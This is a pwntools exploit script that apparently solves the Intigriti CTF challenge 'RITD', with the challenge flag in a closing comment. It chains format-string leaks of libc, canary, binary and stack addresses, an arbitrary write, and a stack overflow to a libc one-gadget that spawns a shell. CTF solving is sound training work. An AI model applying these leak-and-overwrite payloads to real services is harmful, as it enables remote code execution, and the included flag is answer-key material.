#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./RITD_patched")
libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("ritd.ctf.intigriti.io", 1337)
	else:
		r = gdb.debug([exe.path])
	return r


r = conn()


def get_time():
	r.sendlineafter(b'>', b'|X|1|X|')
	r.recvuntil(b'Function: 1\n')
	return str(int(r.recvline().strip().decode()) + 4294967296)

def main():
	r.sendlineafter(b'>', f'|{get_time()}|2 %3$p %75$p %77$p %1$p |hihi|'.encode())
	r.recvuntil(b'Function: 2 0x')
	libc_leak = int(r.recvuntil(b' ').strip().decode(), 16)
	libc.address = libc_leak - (0x7f0e84ce9a37 - 0x7f0e84bd5000)
	canary_leak = int(r.recvuntil(b' ').strip().decode(), 16)
	exe_leak = int(r.recvuntil(b' ').strip().decode(), 16)
	exe.address = exe_leak - (0x55a57d838a45 - 0x55a57d837000)
	stack = int(r.recvuntil(b' ').strip().decode(), 16)

	r.sendlineafter(b'>', f'|{get_time()}|4|X|'.encode())
	r.sendlineafter(b'0x)', hex(stack)[2:].encode())
	r.sendlineafter(b'write there?', b'f')

	ogs = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8, 0xebd52, 0xebdaf, 0xebdb3]
	og = libc.address + ogs[0]

	r.sendlineafter(b'to read?', b'A'*38 + p64(canary_leak) + p64(exe.address+0x4500) + p64(og))

	r.interactive()


if __name__ == "__main__":
	main()

# INTIGRITI{Wh4t_I5_The_P0int_0f_Re4ding_1n_Th3_D4rk}
